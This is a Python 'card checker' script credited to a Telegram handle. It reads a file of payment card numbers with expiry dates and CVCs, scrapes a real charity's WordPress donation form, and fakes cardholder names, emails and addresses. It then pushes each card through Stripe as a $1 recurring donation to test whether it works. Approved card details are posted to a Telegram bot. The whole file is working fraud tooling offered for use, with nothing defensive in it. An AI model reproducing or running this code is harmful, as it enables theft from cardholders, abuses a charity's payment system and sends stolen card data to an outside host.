#!/usr/bin/env python3
# Python script

import requests,random,string,bs4,base64
from bs4 import *
import time,uuid,json,re
import user_agent
import requests
import re
import time
import random
import re,json
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import webbrowser
import time
import threading
from telebot import types
import requests, random, os, pickle, time, re
from bs4 import BeautifulSoup
from colorama import Fore
from getuseragent import UserAgent


O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #kwhite
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple
from cfonts import render  
output = render('FTX', colors=['white', 'red'], align='center')
print(output)
print(X+'________________________________________________')
print(Z+'''\nAuto Stripe Charge Donate 1$ | Dev: @KEVINCODERMAFIA''')
print(X+'________________________________________________')
file = input(B+'YOUR FILE CC NAME : ')
tokbot = input('BOT TOKEN(Optinal) : ')
idbot = input('ID(optinal): ')
file=open(file,"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')		

	r=requests.session()
	import requests,user_agent
	user = user_agent.generate_user_agent()
	
	import random
	
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaln"
	                   "ed", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
	    
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    return first_name, last_name
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	yaram = {
	    'pow': '4922',
	    'pow_ts': '1765678890',
	    'pow_target': 'Mozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
	    'pow_diff': '3',
	    'pow_sig': '1f2ff6d448cff3393448937fe0973d6d1ca1ca98d0e742b598417e0df09db65f',
	    'pow_ver': 'v3',
	    'charitable_session': 'c367ed103a782e0e8516bbd5c71ac264||86400||82800',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-12-14%2002%3A21%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F',
	    'sbjs_first_add': 'fd%3D2025-12-14%2002%3A21%3A42%7C%7C%7Cep%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2F',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
	    'tk_ai': 'NwE0IRBOWiCHsw6DquLinoyg',
	    '__stripe_mid': 'dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1',
	    '__stripe_sid': 'b081920f-09ae-4e5a-9521-b0e96396026f5f3300',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpipelineforchangefoundation.com%2Fdonate%2F',
	}
	
	yaram2 = {
	    'authority': 'pipelineforchangefoundation.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'referer': 'https://pipelineforchangefoundation.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	headersex = {
	    'authority': 'pipelineforchangefoundation.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://pipelineforchangefoundation.com',
	    'referer': 'https://pipelineforchangefoundation.com/donate/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}	
	
	response = requests.get('https://pipelineforchangefoundation.com/donate/', cookies=yaram, headers=yaram2)
	
	
	formid = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
#	print(formid)
	
	nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
	#print(nonce)
	
	cap = re.search(r'name="campaign_id" value="(.*?)"', response.text).group(1)
	#print(cap)
	
	pk_live = re.search(r'"key":"(.*?)"', response.text).group(1)
	#print(pk_live)
	
	
	
	am1 = {
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'Accept': 'application/json',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Referer': 'https://js.stripe.com/',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	ftxbaba = f'type=card&billing_details[name]={first_name}+{last_name}&billing_details[email]={acc}&billing_details[address][city]=New+york&billing_details[address][country]=US&billing_details[address][line1]=New+york+new+states+1000&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=012434816444&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf&muid=dd1cf2bd-d793-4dc5-b60e-faf952c9a4731955c1&sid=911f35c9-ecd0-4925-8eea-5f54c9676f2a227523&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&referrer=https%3A%2F%2Fpipelineforchangefoundation.com&time_on_page=168797&client_attribution_metadata[client_session_id]=2ca8389d-11fd-4b6f-a26a-d076cf9164a8&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}'
	
	yarak3 = requests.post('https://api.stripe.com/v1/payment_methods', headers=am1, data=ftxbaba)
	id = yarak3.json()['id']
	#print(id)
	
	am2 = {
	    'charitable_form_id': formid,
	    formid: '',
	    '_charitable_donation_nonce': nonce,
	    '_wp_http_referer': '/donate/',
	    'campaign_id': cap,
	    'description': 'Donate to Pipeline for Change Foundation',
	    'ID': '742502',
	    'recurring_donation': 'yes',
	    'donation_amount': 'recurring-custom',
	    'custom_recurring_donation_amount': '1.00',
	    'recurring_donation_period': 'week',
	    'custom_donation_amount': '1.00',
	    'first_name': 'ftx',
	    'last_name': first_name,
	    'email': acc,
	    'address': 'ftxbabatek nea ',
	    'address_2': '',
	    'city': 'new york',
	    'state': '100p',
	    'postcode': '10080',
	    'country': 'US',
	    'phone': '02026726732',
	    'gateway': 'stripe',
	    'stripe_payment_method': id,
	    'action': 'make_donation',
	    'form_action': 'make_donation',
	}
	
	r4 = requests.post(
	    'https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php',
	    cookies=yaram,
	    headers=headersex,
	    data=am2,
	)
	if 'Thank you for your donation' in r4.text or 'Thank you' in r4.text or 'Successfully' in r4.text:
		print(F+f'[{start_num}]', P, '|', 'Charge 1.00$✅')
		requests.post(f"https://api.telegram.org/bot{tokbot}/sendMessage?chat_id={idbot}&parse_mode=HTML&text=Stripe Charge Donate1$ ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖  ⇾ <code>{P}</code>\n[↯] 𝗚𝗮𝘁𝗲 ⇾ Stripe Charge 1$ \n[↯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⇾ APPROVED ✅ \n[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ CHARGED 🟢\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾@KEVIN_0x4B65696E")
	elif 'requires_action' in r4.text:
		print(O+f'[{start_num}]', P, '|', 'requires_action')
	else:
		ftx = r4.json()['errors']
		print(O + f'[{start_num}]', P, '|', ftx)
		time.sleep(5)
	"""
	secret = response.json()['secret']
	print(secret)
	
	pi = re.search(r'(pi_[a-zA-Z0-9]+)', secret).group(1)
	print(pi)
	receipt = response.json()['redirect_to']
	print("Receipt İd", receipt)
	import requests
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'expected_payment_method_type=card&use_stripe_sdk=true&key={pk_live}&client_attribution_metadata[client_session_id]=78d1044e-1ded-4515-991f-7cc72b12f846&client_attribution_metadata[merchant_integration_source]=l1&client_secret={secret}'
	
	response = requests.post(
	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
	    headers=headers,
	    data=data,
	)
	print(response.json())
	"""